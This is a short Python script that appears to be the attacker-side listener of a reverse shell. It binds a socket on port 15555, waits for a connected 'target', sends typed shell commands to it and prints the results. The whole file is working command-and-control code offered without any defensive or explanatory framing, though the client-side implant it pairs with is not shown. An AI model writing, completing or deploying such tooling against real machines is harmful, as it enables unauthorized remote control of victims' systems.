#!/usr/bin/python
import socket
import json

def reliable_send(data):
    """Send JSON-encoded data to the target."""
    json_data = json.dumps(data)
    target.send(json_data.encode())

def reliable_recv():
    """Receive and decode JSON data from the target."""
    data = ""
    while True:
        try:
            chunk = target.recv(1024).decode()
            if not chunk:
                continue
            data += chunk
            return json.loads(data)
        except ValueError:
            continue

def shell():
    """Interactive shell for communicating with the target."""
    while True:
        command = input(f"* shell#~{str(ip)}: ")
        reliable_send(command)
        if command == "q":
            break
        try:
            result = reliable_recv()
            print(result)
        except Exception as e:
            print(f"Error receiving response: {e}")

# Server setup
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("127.0.0.1", 15555))  # Change port if needed
server.listen(1)
print("Listening for incoming connections...")
target, ip = server.accept()
print(f"Target connected from {ip}")
shell()
